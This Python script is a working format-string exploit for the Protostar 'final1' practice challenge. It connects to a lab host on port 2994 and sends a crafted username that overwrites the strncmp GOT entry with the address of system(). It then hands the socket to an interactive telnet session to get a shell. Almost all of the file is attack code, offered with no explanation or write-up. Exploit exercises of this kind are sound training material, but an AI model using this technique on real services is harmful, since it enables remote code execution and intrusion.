import socket
import struct
import telnetlib

###################################
#                                 #
#       protostar final1          #
#                                 #
###################################

ip='192.168.207.130'
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
so.connect((ip,2994))

def read(x):
    buf=''
    while x not in buf:
        buf+=so.recv(1)
    return buf

strncmp=struct.pack("I",0x804a1a8)
strncmp2=struct.pack("I",0x804a1aa)

#overwrite strncmp entry  with system 
# system addr=0xb7ecffb0

IP,port=so.getsockname() 

host=IP+":"+str(port)
pad="A"*(24-len(host))

username=pad+strncmp+strncmp2+'%65408x%17$n%47164x%18$n'

login='intx0x80'

print read("[final1] $")

so.send('username '+username+"\n")
print read("[final1] $")
so.send('login '+login+"\n")
print read("[final1] $")

t=telnetlib.Telnet()
t.sock=so
t.interact()
